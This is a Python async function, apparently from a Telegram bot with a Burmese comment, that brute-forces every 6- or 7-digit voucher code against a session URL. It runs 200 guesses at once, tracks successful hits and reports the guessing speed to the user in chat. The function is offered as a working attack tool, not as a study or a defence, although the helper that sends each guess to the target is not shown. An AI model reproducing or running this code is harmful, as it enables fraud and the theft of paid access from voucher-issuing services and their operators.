async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    sem = asyncio.Semaphore(200) # Concurrency ကို 200 သို့ လျှော့ချထားပါ

    async def _check(code):
        nonlocal checked
        async with sem:
            res = await perform_check(session_url, code, chat_id, scan_id)
            checked += 1
            return res

    last_update = time.monotonic()

    async def _flush_progress():
        nonlocal last_update
        now = time.monotonic()
        if now - last_update < 1.0:
            return
        last_update = now
        elapsed = now - scan_start
        speed = (checked / elapsed * 60) if elapsed > 0 else 0
        found = len(success_texts.get(chat_id, []))
        
        if total:
            percent = (checked / total) * 100
            text = (
                f"🔍 **Scanning VOUCHER Codes...**\n\n"
                f"📦 Checked : {checked:,} / {total:,}\n"
                f"📊 Progress : {percent:.2f}%\n"
                f"⚡ Speed : {speed:,.0f} codes/min\n"
                f"✅ Success code hit : {found}"
            )
        else:
            text = (
                f"🔍 **Scanning VOUCHER Codes...**\n\n"
                f"📦 Checked : {checked:,}\n"
                f"⚡ Speed : {speed:,.0f} codes/min\n"
                f"✅ Success code hit : {found}"
            )
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=progress_msg.message_id,
                text=text,
                reply_markup=get_stop_keyboard(),
                parse_mode="Markdown"
            )
        except Exception:
            pass

    try:
        batch_size = 200
        batch = []
        for code in code_iter:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                break
            
            batch.append(_check(code))
            if len(batch) >= batch_size:
                await asyncio.gather(*batch)
                batch = []
                await _flush_progress()
        
        if batch:
            await asyncio.gather(*batch)
            await _flush_progress()

    except asyncio.CancelledError:
        pass
    finally:
        scan_tasks.pop(chat_id, None)
